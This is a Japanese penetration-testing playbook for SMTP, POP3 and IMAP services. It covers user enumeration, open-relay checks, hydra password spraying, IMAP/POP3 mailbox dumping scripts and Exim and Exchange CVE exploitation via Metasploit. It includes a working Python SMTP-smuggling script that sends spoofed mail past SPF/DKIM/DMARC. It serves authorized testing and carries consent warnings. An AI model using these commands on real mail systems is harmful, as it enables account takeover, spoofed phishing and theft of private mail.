# Mail Services（SMTP / POP3 / IMAP）

> **スコープ: 25 / 465 / 587 / 110 / 995 / 143 / 993 ポート（メール系）の列挙〜認証突破〜認証後のメール本文精査・既知 CVE による直接侵入まで**を 1 ファイルで扱う。SMTP（25 平文 / 465 SMTPS / 587 Submission）/ POP3（110 平文 / 995 POP3S）/ IMAP（143 平文 / 993 IMAPS）を統合。STARTTLS / TLS 構成の詳細監査は `../01_Reconnaissance/TLS_Audit.md` を参照。

## 着火条件

以下のいずれかに該当する場合:

- SMTP / POP3 / IMAP のいずれかが開いている（メールサーバーがインターネット露出）
- 既に取得した認証情報の **使い回し試行先** として（Web / SSH / FTP で取れた cred がメールでも通るか）
- AD 環境で Exchange / Office 365 連携が疑われ、ユーザー名列挙経路として使う
- 製品出荷時のデフォルト認証情報を試行する許可がある

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `nmap` / `nc` / `smtp-user-enum` / `hydra` / `swaks`（`apt install swaks` 別途インストール）/ `searchsploit` / `python3` (`smtplib` / `poplib` / `imaplib`)（明示記載以外はペネトレ用 Linux ディストリ標準搭載）
- 外部リソース依存: 辞書ファイル (`/usr/share/wordlists/rockyou.txt` 等) は標準同梱、オフラインでも実施可

## 先に確認すること

- **ロックアウト設定**: `Account_Lockout_Recon.md` の SMTP / IMAP / POP3 節（Exchange / Postfix / Dovecot の設定）
- **VRFY / EXPN の有効性**: 新しい MTA（Postfix 2.x 以降のデフォルト、Exchange）ではデフォルト無効。`HELP` の応答で確認してから §3 に進む
- **製品種別**: バナー (§1) で MTA / Exchange / Dovecot / Cyrus 等を判別してから §9 CVE 照合に進む

> 原理（SMTP 対話モデル / VRFY-EXPN が無効化された歴史 / STARTTLS と Implicit TLS / SPF-DKIM-DMARC / SASL 認証メカニズム 等）→ `../06_Concepts/Mail_Protocols.md`

**攻撃者の思考トレース:** メールサービスは **ユーザー列挙経路** と **認証スプレー先** の 2 用途で価値が高い。AD 環境の Exchange はドメインユーザー名を SMTP / OWA 経由で漏らしやすく、得たユーザーリストはそのまま他プロトコル（SSH / WinRM / SMB）のスプレーに転用できる。**「メールから cred 取れる」より「メールからユーザーリスト取れる」が本命**。一方、IMAP 認証突破後のメール本文には他システムの API トークン・DB cred が散見されるため、認証突破できた場合は宝の山になる。

---

## 1. バナー観察 / 製品判定（SMTP / POP3 / IMAP 一括）

**コマンド:**

```bash
# [Attacker] nmap でメール系ポートをまとめてバナー取得
nmap -sV -p 25,110,143,465,587,993,995 [TARGET_IP]

# [Attacker] SMTP バナー（25 / 465 / 587）
nc [TARGET_IP] 25
# 220 mail.example.test ESMTP Postfix
QUIT

# [Attacker] POP3 バナー（110 / 995）
nc [TARGET_IP] 110
# +OK Dovecot ready.
QUIT

# [Attacker] IMAP バナー（143 / 993）
nc [TARGET_IP] 143
# * OK [CAPABILITY IMAP4rev1 ...] Dovecot ready.
. LOGOUT
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `220 ... ESMTP Postfix` | Postfix 系（VRFY/EXPN は無効が多い）| §3 RCPT TO モード優先 |
| `220 ... ESMTP Exim 4.87` 〜 `4.91` | **Exim CVE-2019-10149 (Return of the WIZard)** 該当範囲の可能性 | §9 Exim CVE へ |
| `220 Microsoft ESMTP MAIL Service` / Microsoft Exchange | Exchange 環境 | §9 Exchange CVE (ProxyLogon / ProxyShell / ProxyNotShell) 該当性確認 |
| `220 ... Sendmail` | レガシー Sendmail | `searchsploit sendmail` で旧 CVE 確認 |
| `+OK Dovecot` / `* OK ... Dovecot` | Dovecot POP/IMAP | `searchsploit dovecot` で CVE 確認 |
| `* OK ... Microsoft Exchange Server` (IMAP) | Exchange IMAP | §9 Exchange CVE |
| `* OK Cyrus IMAP` | Cyrus IMAP | `searchsploit cyrus` |
| バナーに内部ホスト名・FQDN | 内部ドメイン名漏洩 | `../01_Reconnaissance/DNS_Enumeration.md` の手掛かりに反映 |
| `STARTTLS` を広告 | TLS アップグレード対応 | TLS 構成は `../01_Reconnaissance/TLS_Audit.md` で詳細監査 |

> **注意:** バナーは設定で偽装可能（`smtpd_banner` 等）。version 文字列だけで CVE 該当を断定せず、実挙動で確認する。

---

## 2. SMTP 機能列挙（EHLO / HELP / AUTH メカニズム）

**コマンド:**

```bash
# [Attacker] SMTP 対話 — EHLO で対応拡張機能・AUTH メカニズムを列挙
nc [TARGET_IP] 25
EHLO test
# 250-mail.example.test
# 250-PIPELINING
# 250-SIZE 10240000
# 250-STARTTLS
# 250-AUTH LOGIN PLAIN     ← AUTH メカニズム
# 250-AUTH=LOGIN PLAIN
# 250-VRFY                 ← VRFY / EXPN の有無（無ければ §3 RCPT モードへ）
# 250 HELP
HELP                       # サポートコマンド一覧
QUIT

# [Attacker] nmap スクリプトで一括判定
nmap -p 25,465,587 --script smtp-commands [TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `250 VRFY` / `250-VRFY` が含まれる | VRFY 有効 | §3 VRFY モード |
| `250 EXPN` が含まれる | EXPN 有効・メーリングリスト展開可能 | §3 EXPN モード |
| `VRFY` / `EXPN` が含まれない | 新しい MTA で無効化済 | §3 RCPT TO モード（バウンス挙動の差で判定）|
| `250 AUTH LOGIN PLAIN` | SMTP AUTH 有効 | §7 認証スプレー対象 |
| `250 AUTH NTLM` / `250 AUTH GSSAPI` | NT LAN Manager 認証広告 | Exchange の可能性大、§7 NTLM スプレーの候補 |
| `250 STARTTLS` のみで `AUTH` 不在 | submission ポート未対応 / TLS 後しか AUTH 受け付けない | `swaks --tls --auth ...` で STARTTLS 後にスプレー |
| `502 Command not implemented` 大量 | 機能が削られた厳格設定 | スプレー困難、別経路へ |

---

## 3. SMTP ユーザー列挙（VRFY / EXPN / RCPT TO）

**着火条件:** §2 で SMTP の対応コマンドを確認済み。ユーザー名候補リスト（`users.txt`）を別経路（OSINT / GitHub `.keys` / LinkedIn 等）から準備済み。

**コマンド:**

```bash
# [Attacker] VRFY モード（最も古典・有効環境は限定的）
smtp-user-enum -M VRFY -U users.txt -t [TARGET_IP]
# 出力例: [USER]@... exists

# [Attacker] EXPN モード（メーリングリスト展開）
smtp-user-enum -M EXPN -U users.txt -t [TARGET_IP]

# [Attacker] RCPT TO モード（VRFY/EXPN 無効環境向け・バウンス挙動の差で判定）
smtp-user-enum -M RCPT -U users.txt -t [TARGET_IP] -D [TARGET_DOMAIN]

# [Attacker] 手動で対話確認
nc [TARGET_IP] 25
EHLO test
VRFY [USER]
# 252 [USER]@example.test    ← 存在を示唆（厳密には未確定）
# または 250 [USER]            ← 存在確定
# または 550 5.1.1 ... unknown ← 不在確定
EXPN [MAILING_LIST]
QUIT
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `250 [USER]` (VRFY) / `252 [USER]` | ユーザー存在を示唆 | リストに追加 → §7 スプレー対象 |
| `550 5.1.1 ... unknown` | 不在確定 | リストから除外 |
| `RCPT TO` 受理（応答コード `250`）+ 後で `MAIL FROM:<>` バウンス無し | ユーザー存在 | RCPT TO バウンス挙動の差を観察 |
| `RCPT TO` 全て受理 | catch-all 設定 / アンチ列挙対策 | §3 は無効 → OSINT 経路に切替 |
| `502 Command not implemented` | VRFY/EXPN が無効化 | RCPT TO モードのみで試行 |
| EXPN で内部メーリングリスト展開（`team@`, `dev@`, `admin@`）| 組織構造の漏洩 | 内部ユーザーリストとして整理、AD 命名規則の推定材料 |

> **AD 環境の場合:** Exchange は OWA / EWS の認証エラー応答からも user enum 可能（`/owa/auth.owa` での timing 差 / `/EWS/Exchange.asmx` での 401 vs 404）。詳細は別途。

---

## 4. オープンリレー判定

**着火条件:** SMTP が外部からアクセス可能。**現代では稀**だがレガシー機器・誤設定で見つかることがある。

**コマンド:**

```bash
# [Attacker] nmap スクリプトで一括判定（複数パターンを内部で試行）
nmap -p 25 --script smtp-open-relay [TARGET_IP]

# [Attacker] swaks で実送信テスト（許可されたターゲットのみ・テスト識別子を入れる）
swaks --to external@example.invalid \
      --from "kedalab-[CASE_ID]@[TARGET_DOMAIN]" \
      --server [TARGET_IP] \
      --header "Subject: kedalab-[CASE_ID] relay test"

# [Attacker] 手動確認（外部宛が受理されるか）
nc [TARGET_IP] 25
EHLO test
MAIL FROM:<test@example.invalid>
RCPT TO:<external@example.invalid>
DATA
Subject: relay test
.
QUIT
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `nmap` で `Server is an open relay` | オープンリレー成立 | finding として記録。実送信は事前合意必須 |
| `RCPT TO` で外部宛が `250` 受理 | リレー可能性高い | swaks で実送信して着信確認（許可された宛先のみ）|
| `relay denied` / `554 5.7.1` | リレー拒否（正常設定）| §5 SPF/DKIM/DMARC 確認へ |
| `swaks` でリレー成功するが宛先に届かない | 受信側で SPF / DKIM / DMARC により破棄 | リレー成立自体を脆弱性として記録、実害は受信側設定次第 |

> **注意:** オープンリレーが見つかってもフィッシング基盤化（実送信）は **書面承認必須**。`finding として記録 → 報告書に記載` で止めるのが本番の基本動作。

---

## 5. SPF / DKIM / DMARC 設定確認（受信側設定の finding）

**着火条件:** 対象組織のドメインに対する詐称メール耐性を確認する。診断スコープに「メール認証の評価」が含まれる場合。

**コマンド:**

```bash
# [Attacker] SPF レコード確認
dig +short [TARGET_DOMAIN] TXT | grep -i "v=spf1"
# 例: v=spf1 ip4:203.0.113.0/24 include:_spf.example.com -all

# [Attacker] DKIM セレクタ確認（セレクタ名は組織依存・default / google / selector1 等を順に試す）
dig +short default._domainkey.[TARGET_DOMAIN] TXT
dig +short google._domainkey.[TARGET_DOMAIN] TXT
dig +short selector1._domainkey.[TARGET_DOMAIN] TXT

# [Attacker] DMARC レコード確認
dig +short _dmarc.[TARGET_DOMAIN] TXT
# 例: v=DMARC1; p=none; rua=mailto:dmarc@example.com
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| SPF レコードが `~all`（soft fail）または `?all`（neutral）| 詐称メール緩い | finding として記録、`-all` (hard fail) 推奨を報告 |
| SPF レコードが存在しない | SPF 未設定 | finding として記録、なりすまし容易 |
| DMARC レコードが `p=none` | 監視モードのみ・拒否しない | finding として記録、`p=quarantine` or `p=reject` 推奨 |
| DMARC レコードが存在しない | DMARC 未設定 | finding として記録 |
| DKIM セレクタが見つからない | DKIM 未設定 or セレクタ名不明 | OSINT で組織が使う ESP（SendGrid / Mailgun 等）を推定してセレクタ候補を絞る |
| SPF に `+all` を含む | **全送信元を許可（重大な誤設定）** | 詐称メール送信可能、即報告 |

> **注意:** 本セクションは **finding 記録の観点**。直接的な侵入経路ではないが、Open Relay / 認証突破成功時のフィッシング基盤化リスク評価に直結する。

---

## 6. SMTP Smuggling（EOD シーケンス解釈差悪用 / SPF・DKIM・DMARC バイパス）

**着火条件:** 送信側 MTA (outbound) または受信側 MTA (inbound) のいずれかが、`DATA` 本文終端 (EOD) シーケンスの解釈に非標準のバリエーション (`<LF>.<LF>` / `<CR>.<CR>` / `<LF>.<CR><LF>`) を受け入れる。SPF/DKIM/DMARC が `p=reject` で構築されていても、送信元 IP が正規 outbound MTA のものになるため alignment が通り、フィッシング基盤化できる。Open Relay (§4) が事実上死んでいる中、2023 年 12 月に Timo Longin (SEC Consult) が公開した「現代の MTA でメールスプーフィングを成立させる手段」。

> 原理（EOD シーケンスの RFC 5321 vs RFC 5322 解釈差・BDAT/CHUNKING との関係・なぜ outbound と inbound で解釈が乖離するか）→ [`../06_Concepts/Mail_Protocols.md`](../06_Concepts/Mail_Protocols.md) §12

**コマンド:**

```bash
# [Attacker] 受信側 (inbound) の EOD 解釈差判定 — CHUNKING の有無で当たり付け
# CHUNKING 未対応 = 古典 DATA 経路のみ = EOD 解釈差で smuggling 成立可能性大
nc [TARGET_IP] 25
EHLO test
# 250-CHUNKING の有無を確認
QUIT

# [Attacker] 複数 MX に対する CHUNKING 状態の一括確認
for mx in $(dig +short MX [TARGET_DOMAIN] | awk '{print $2}' | sed 's/\.$//'); do
  echo "=== $mx ==="
  (printf 'EHLO test\r\nQUIT\r\n'; sleep 2) | nc -w 5 "$mx" 25 | grep -iE "CHUNKING|BDAT"
done

# [Attacker] 送信側 (outbound) の sanitize 判定 — 自テナント間限定・書面承認必須
# 本文中に非標準 EOD (\n.\r\n) を埋め、受信側で 2 通に分裂するか観察
# 生バイト送信が必須 (swaks の --data は本文を正規化するため smuggling 実証には使えない)
python3 <<'EOF'
import socket, ssl, base64
ctx = ssl.create_default_context()
s = socket.create_connection(("[OUTBOUND_MTA]", 587))
print(s.recv(4096).decode(errors="ignore"))                           # 220 banner
s.sendall(b"EHLO test\r\n");          print(s.recv(4096).decode(errors="ignore"))
s.sendall(b"STARTTLS\r\n");           print(s.recv(4096).decode(errors="ignore"))
s = ctx.wrap_socket(s, server_hostname="[OUTBOUND_MTA]")
s.sendall(b"EHLO test\r\n");          print(s.recv(4096).decode(errors="ignore"))
s.sendall(b"AUTH LOGIN\r\n");         print(s.recv(4096).decode(errors="ignore"))
s.sendall(base64.b64encode(b"[USER]") + b"\r\n");     print(s.recv(4096).decode(errors="ignore"))
s.sendall(base64.b64encode(b"[PASSWORD]") + b"\r\n"); print(s.recv(4096).decode(errors="ignore"))
s.sendall(b"MAIL FROM:<kedalab-[CASE_ID]@[OWN_DOMAIN]>\r\n"); print(s.recv(4096).decode(errors="ignore"))
s.sendall(b"RCPT TO:<victim@[ATTACKER_OWNED_DOMAIN]>\r\n");   print(s.recv(4096).decode(errors="ignore"))
s.sendall(b"DATA\r\n");                                       print(s.recv(4096).decode(errors="ignore"))
# 本文: 非標準 EOD \n.\r\n を埋めて 2 通目を密輸
payload = (
    b"From: <kedalab-[CASE_ID]@[OWN_DOMAIN]>\r\n"
    b"Subject: outer kedalab-[CASE_ID]\r\n\r\n"
    b"outer body\r\n"
    b"\n.\r\n"                                                # ← 非標準 EOD (LF.CRLF)
    b"MAIL FROM:<spoofed@example.test>\r\n"
    b"RCPT TO:<victim@[ATTACKER_OWNED_DOMAIN]>\r\n"
    b"DATA\r\n"
    b"From: spoofed@example.test\r\n"
    b"Subject: smuggled kedalab-[CASE_ID]\r\n\r\n"
    b"smuggled body\r\n"
    b".\r\n"                                                  # 標準 EOD で全体を閉じる
)
s.sendall(payload);   print(s.recv(4096).decode(errors="ignore"))
s.sendall(b"QUIT\r\n"); print(s.recv(4096).decode(errors="ignore"))
EOF

# [Attacker] 受信ヘッダで認証結果を確認 (IMAP/POP3 ログイン後 §8 経路)
# 受信した 2 通目 (Subject: smuggled) の Authentication-Results ヘッダで
# spf=pass / dkim=pass / dmarc=pass が付いていれば認証バイパス成立
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `EHLO` 応答に `CHUNKING` 無し | 古典 DATA 経路のみ・受信側 EOD 解釈差で smuggling 成立可能性大 | outbound 側 sanitize 判定へ進む |
| `EHLO` 応答に `CHUNKING` あり | BDAT 経路あり・inbound smuggling は緩和されている可能性 | 別 outbound 製品で再試行 / `<CR>.<CR>` 等別バリエーション試行 |
| Outbound 経由送信で受信側が 2 通に分裂 (outer / smuggled) | Outbound smuggling 成立 | 受信ヘッダの `Authentication-Results` を確認 |
| Outbound 経由送信で 1 通に統合される / `MAIL FROM` 削除される | Outbound 側で sanitize 済 | 別 outbound 製品で再試行 / 受信側 (inbound) 単体経路に切替 |
| 受信ヘッダの `Authentication-Results` に `dmarc=pass header.from=spoofed@example.test` | DMARC alignment バイパス成立 | finding 化・影響大 |
| 送信側で `500 line too long` / `554 5.6.0` | bare LF を outbound が拒否 (修正済) | 別バリエーション (`<CR>.<CR>` / smaller payload) 試行 |

### 6.1 製品別 修正状況早見表（2023 年公開時点 → 2024 年初頭・要再確認）

| 製品 | 状況 |
|---|---|
| GMX / Ionos | 2023-08 修正済 (outbound sanitize 追加) |
| Microsoft Exchange Online | 2023-10 修正済 (outbound sanitize 追加) |
| Cisco Secure Email Gateway / Cloud Gateway | 「feature, not bug」扱い・デフォルト未修正。CR/LF handling 設定を `Clean` から `Allow` または `Reject` に変更で緩和 |
| Postfix | デフォルト構成で脆弱 (CHUNKING 未対応ビルドが多い)。`smtpd_forbid_bare_newline = yes` 導入バージョン (3.5.23 / 3.6.13 / 3.7.9 / 3.8.4 以降と記憶・要検証) |
| Sendmail | デフォルト構成で脆弱・標準的修正パラメータは要再確認 |

> **再確認の動機:** 上表は SEC Consult 元レポート (Timo Longin, 2023-12) と当時の業界対応状況の抜粋。2026 年現在の状況は変動する可能性があるため、対象環境の製品・バージョンに該当する advisory を一次ソースで再確認すること。

**注意:** **実 PoC 送信は書面承認必須**。Open Relay (§4) 以上にレピュテーション・スプーフィング被害リスクが大きい。検証は自テナント間または事前合意ターゲットのみ。`kedalab-[CASE_ID]` テスト識別子を Subject と From: に必ず入れ、受信側削除等の原状回復をテスト完了時に実施する。公開 PoC ツール (GitHub の `The-Login/SMTP-Smuggling-Tools` 等・未検証) を使う場合も同じ事前合意要件が適用される。

---

## 7. SMTP / POP3 / IMAP 認証スプレー

**事前準備（必須）:** `Account_Lockout_Recon.md` でメールサービス側のロックアウト閾値を確認し、試行間隔を設計する。Exchange は AD ロックアウトと連動するため特に注意。

**コマンド:**

```bash
# [Attacker] SMTP AUTH スプレー（25 / 465 / 587）
hydra -L users.txt -p '[PASSWORD]' [TARGET_IP] smtp
hydra -L users.txt -P passwords.txt [TARGET_IP] smtps -s 465
hydra -L users.txt -p '[PASSWORD]' -s 587 [TARGET_IP] smtp

# [Attacker] POP3 スプレー（110 / 995）
hydra -L users.txt -p '[PASSWORD]' [TARGET_IP] pop3
hydra -L users.txt -p '[PASSWORD]' [TARGET_IP] pop3s -s 995

# [Attacker] IMAP スプレー（143 / 993）
hydra -L users.txt -p '[PASSWORD]' [TARGET_IP] imap
hydra -L users.txt -p '[PASSWORD]' [TARGET_IP] imaps -s 993

# [Attacker] swaks で SMTP AUTH を手動確認
swaks --to test@[TARGET_DOMAIN] --from test@[TARGET_DOMAIN] \
      --server [TARGET_IP] --auth LOGIN \
      --auth-user [USER] --auth-password '[PASSWORD]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[PORT][SERVICE] host: [IP]   login: [USER]   password: [PASS]` (hydra) | 認証成功 | §8 メール本文精査へ |
| 全 cred が拒否 | 認証情報全滅 / 接続元 IP 制限 / Exchange の Conditional Access | OSINT でメール cred を別経路（漏洩 DB / GitHub）から確認 |
| 試行が極端に遅い | サーバー側レート制限・Exchange Throttling Policy | `hydra -t 1 -W 30` で並列度 1・待機 30 秒 |
| `Connection closed by ...` を繰り返す | fail2ban / Exchange 接続元 IP BAN | 接続元を変える / 時間をおいて再開 |
| 一部ユーザーで `successful` 表示だが実は MFA で実認証は失敗 | 認証は通っているが MFA で止まっている | OWA / EWS 経由で MFA バイパス経路を別途検討（高難度・別領域）|

---

## 8. POP3 / IMAP 認証突破後のメール本文精査

**着火条件:** §7 で POP3 / IMAP の認証突破成功。メール本文・添付から他システムの cred / API トークン / 内部情報を抽出する。

**コマンド:**

```bash
# [Attacker] IMAP に対話接続
openssl s_client -connect [TARGET_IP]:993 -crlf -quiet
# または平文の場合: nc [TARGET_IP] 143
. LOGIN [USER] [PASSWORD]
. LIST "" "*"                          # フォルダ一覧
. SELECT INBOX
. FETCH 1:* (BODY[HEADER.FIELDS (FROM SUBJECT)])
. FETCH 1 BODY[]                       # 1 通目の全文
. LOGOUT

# [Attacker] Python でメール本文をローカルにダンプ（IMAP）
python3 <<'EOF'
import imaplib, email
M = imaplib.IMAP4_SSL("[TARGET_IP]", 993)
M.login("[USER]", "[PASSWORD]")
M.select("INBOX")
typ, data = M.search(None, "ALL")
for num in data[0].split():
    typ, msg_data = M.fetch(num, "(RFC822)")
    msg = email.message_from_bytes(msg_data[0][1])
    print("From:", msg["From"], " Subject:", msg["Subject"])
    # 必要なら本文取り出し: msg.get_payload(decode=True)
M.logout()
EOF

# [Attacker] POP3 で同様（IMAP より制限的、フォルダ概念なし）
python3 <<'EOF'
import poplib
M = poplib.POP3_SSL("[TARGET_IP]", 995)
M.user("[USER]")
M.pass_("[PASSWORD]")
nm = len(M.list()[1])
for i in range(nm):
    resp, lines, octets = M.retr(i + 1)
    print(b"\n".join(lines).decode("utf-8", errors="ignore"))
M.quit()
EOF
```

> **heredoc 構文（`python3 <<'EOF' ... EOF`）について:** 上記の Python ブロックは bash の **heredoc 構文**で書いており、**`<<'EOF'` から `EOF` までを Python の標準入力に流し込んで即実行する**形。**ファイル作成不要・ターミナルに貼り付けるだけで動く**。
>
> シングルクォート付き `'EOF'` は「bash による変数展開を抑止」する作法（Python コード内の `$` や `` ` `` が bash に誤解釈されないように）。
>
> **ファイル形式で繰り返し実行したい場合は以下のように書き換える:**
>
```bash
# [Attacker] スクリプトをファイルに保存して実行（繰り返し・微調整向け）
cat > /tmp/imap_dump.py <<'EOF'
import imaplib, email
M = imaplib.IMAP4_SSL("[TARGET_IP]", 993)
M.login("[USER]", "[PASSWORD]")
M.select("INBOX")
# ... (省略)
EOF
python3 /tmp/imap_dump.py
# 後始末: rm /tmp/imap_dump.py
```
>
> 機能は同じ。**heredoc = 一発実行用 / ファイル = 繰り返し実行用** で使い分ける。kedalab の他ファイル（SSH.md §11 Redis 経由 authorized_keys 書込・FTP.md §6 PCAP 抽出 等）でも同じパターンを採用している。

**観測される出力 → 次のアクション:**

| 観測 | 示唆 | 次のアクション |
|---|---|---|
| 「パスワード仮発行」「ようこそ」系の自動メール | 平文 cred が本文に残存 | grep `password\|passwd\|api[_-]?key\|token` で抽出、他システムに使い回し試行 |
| AWS / Azure / GCP / GitHub からの通知 | API キー・アクセストークン埋め込みの可能性 | 該当本文を grep |
| 業務システムからの「招待リンク」「リセットリンク」| URL に セッショントークン・一時パスワード | リンクを抜いて web セッションへの侵入経路 |
| 内部 wiki / Jira / Confluence の通知 | 内部 URL・プロジェクト構造の漏洩 | 内部 URL 構造を整理して横展開候補に |
| `.zip` / `.pdf` / `.docx` 添付 | メタデータ・本文に cred / 内部情報 | ローカルに保存して `Binary_Analysis.md` / `../01_Reconnaissance/Metadata_Analysis.md` 経路へ |
| メール送信フォルダ（Sent）に同様の cred 含む送信履歴 | 認証情報の他者への漏洩経路 | 同様に精査・関与ユーザーリストを拡張 |

> **[HIGH IMPACT]** 業務メール本文の読取は **プライバシー領域**。事前合意で「メール本文の読取可否・対象ユーザー範囲・保管・破棄」を **書面で限定**する。対象組織の合意なしでメール内容を読まない・コピーしない。

---

## 9. 既知 CVE による直接侵入

**着火条件:** §1 でバージョン文字列が取れている。version 該当の CVE が公開 PoC を持つ。

### 9.1 Microsoft Exchange ProxyLogon / ProxyShell / ProxyNotShell

**背景:**

- **CVE-2021-26855 (ProxyLogon)**: SSRF + 認証バイパス + 任意ファイル書込み → webshell 配置 → RCE。2021 年に世界規模の悪用キャンペーンが発生
- **CVE-2021-34473 (ProxyShell)**: 認証バイパス + 任意 PowerShell 実行 → RCE
- **CVE-2022-41040 / 41082 (ProxyNotShell)**: ProxyShell の派生・部分パッチ回避

**コマンド:**

```bash
# [Attacker] ProxyLogon の影響範囲判定（Exchange のビルド番号 / OWA バージョン確認）
curl -sk "https://[TARGET_IP]/owa/auth/logon.aspx" | grep -oE '15\.[0-9]+\.[0-9]+\.[0-9]+'
# 出力例: 15.2.792.10  (Exchange 2019)
# パッチ済みビルド番号と照合 (MSRC アドバイザリ参照)

# [Attacker] nuclei テンプレートで一括検出
nuclei -t exposures/configs/exchange-server-info.yaml -u https://[TARGET_IP]

# [Attacker] searchsploit / 公開 PoC（事前合意済み環境のみ）
searchsploit "Microsoft Exchange" ProxyShell
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Exchange ビルド番号が ProxyLogon / ProxyShell 未パッチ範囲 | 該当 CVE 適用可能 | **事前合意必須**。実 exploit は MSRC 公開後の防御側監視が極めて厳しい |
| OWA `/owa/auth/logon.aspx` で `200` レスポンス | OWA 露出済み | OWA 経由のフィッシング・PtH リスクも併せて記録 |
| ビルド番号がパッチ済み | パッチ適用済み | §7 認証スプレー or 別経路へ |

### 9.2 Exim CVE-2019-10149 (Return of the WIZard)

**背景:** Exim 4.87〜4.91 の `deliver_message` 関数に root 権限での RCE。`RCPT TO:<${run{...}}@localhost>` のような payload で任意コマンドが実行できる古典的バグ。

**コマンド:**

```bash
# [Attacker] Exim バージョン確認（§1 のバナー or EHLO 応答に出る）
nc [TARGET_IP] 25
EHLO test
# 250-mail.example.test Hello test [client]
# 250-SIZE 52428800
# 250-AUTH LOGIN PLAIN
QUIT

# [Attacker] Metasploit モジュール
msfconsole -q -x "use exploit/unix/smtp/exim4_deliver_message; \
  set RHOSTS [TARGET_IP]; run; exit"

# [Attacker] 手動 PoC（事前合意済み環境のみ）
# 公開 PoC は Exploit-DB / GitHub に多数。バージョン一致を厳密に確認してから実行
searchsploit exim 4.87
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `220 ... ESMTP Exim 4.87` 〜 `4.91` | CVE-2019-10149 該当範囲 | バージョン該当を確認、実 exploit は事前合意必須 |
| `220 ... ESMTP Exim 4.92` 以降 | パッチ済み | §7 認証スプレー or 別経路へ |
| `220 ... Exim` だがバージョン非表示 | banner suppress | `EHLO` の応答や `searchsploit exim` で別経路から推定 |

### 9.3 その他のバージョン依存 CVE（探索パターン）

```bash
# [Attacker] バージョン文字列からの CVE 探索
searchsploit postfix
searchsploit sendmail
searchsploit dovecot
searchsploit cyrus
searchsploit "Microsoft Exchange"

# [Attacker] CVE 番号から PoC を引く
searchsploit -m [EDB-ID]
```

> **注意:** メールサーバ CVE は **業務停止リスクが極めて大きい**（メール疎通停止 = 業務全体への影響）。バージョン該当の確認まで技術的判断で実施可、実 exploit は **書面承認 + 業務時間外 + ロールバック手順合意** が前提。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `VRFY` / `EXPN` が `502 Command not implemented` | MTA で無効化済（Postfix デフォルト等） | §3 `RCPT TO` モード（バウンス挙動の差で判定）|
| `RCPT TO` も「存在/不在で応答が同じ」 | アンチユーザー列挙対策 / catch-all | タイミング差・グレーリスティング応答の差を観察。手詰まりなら OSINT 経路に切替 |
| SMTP AUTH スプレーで全失敗 | 認証バインドが内部認証ソース（AD）依存 / 接続元 IP 制限 / Conditional Access | 別経路（OWA / EWS / IMAP）で同 cred を試行 |
| POP/IMAP スプレーが極端に遅い | サーバー側レート制限 | `hydra -t 1 -W 5` で並列数低下・待機追加 |
| `swaks` でリレー成功するが宛先に届かない | 受信側で SPF / DKIM / DMARC により破棄 | リレー成立自体を脆弱性として記録（実害は受信側設定次第）|
| Exchange CVE の実 exploit が失敗 | パッチ適用済み / 検知ルールでブロック | OWA / EWS の認証スプレーに切替 |
| Exim CVE-2019-10149 が動かない | パッチ済み / ESMTP 拡張無効化 | バージョン非該当として撤退、別 CVE 探索 |

## 注意点・落とし穴

> **[HIGH IMPACT]** §7 SMTP AUTH / POP / IMAP スプレーは以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック・受信メール拒否・Exchange の Conditional Access 一時 BAN）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Exchange 認証ログ・SMTP AUTH ログ・Azure AD Sign-in ログ）
>
> 実施可否は事前合意で明示確認すること。**取得した cred を実際にメール送信に使うのは別途書面承認必須**（フィッシング基盤化リスク）。演習環境（HTB / OSCP 等）では制約なし。

> **[HIGH IMPACT]** §8 認証突破後のメール本文読取は **プライバシー領域**。対象ユーザー範囲・保管・破棄を書面で限定。**業務メールの一括コピー・保存は原則禁止**。grep 抽出のみに留め、無関係なメール本文を読まない。

> **[HIGH IMPACT]** §9 既知 CVE 実 exploit（特に §9.1 Exchange ProxyLogon/ProxyShell / §9.2 Exim CVE-2019-10149）は以下の理由で本番では原則禁止または個別合意必須:
> - [x] メールサーバ停止 = 業務全体への影響（業務停止リスク最高クラス）
> - [x] 不可逆な設定変更を含む（webshell 配置 / メールキュー破壊リスク）
> - [x] SIEM/EDR で確実に検知される（IDS シグネチャに古典 PoC が登録済み・国家攻撃者級の監視）
>
> バージョン該当の確認（§1）まで技術的判断で実施可。実 exploit は **書面承認 + 業務時間外 + ロールバック手順合意** 必須。

> **[HIGH IMPACT]** §4 オープンリレーで実送信テストは **送信側 IP のレピュテーション低下** リスク。`swaks` での疎通確認は 1 回限り・自テスター宛のみ。フィッシング基盤化（外部宛大量送信）は別途書面承認必須。

> **[HIGH IMPACT]** §6 SMTP Smuggling の実 PoC 送信は以下の理由で本番では原則禁止または個別合意必須:
> - [ ] 業務停止リスク（直接停止は無いが、検証メールが受信者の業務メールフローに混入する）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（DMARC レポートに不正な From: が記録・受信側 SEG ログ・送信側 outbound SaaS の不正使用検知）
>
> **追加リスク（Open Relay 以上）**: 成立すれば SPF/DKIM/DMARC を通って受信者のフィッシング体験になる。送信元の正規ドメインのレピュテーションを毀損し、被害は技術的範囲を超えて広範囲に波及する。検証は自テナント間 (`[OWN_DOMAIN]` → `[ATTACKER_OWNED_DOMAIN]`) または書面承認済みターゲットのみ。Subject に `kedalab-[CASE_ID]` を必ず入れ、受信側で完了後に削除する。

> **個別のブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロックを横断する高影響の警告のみを置く。

### 本番での前提

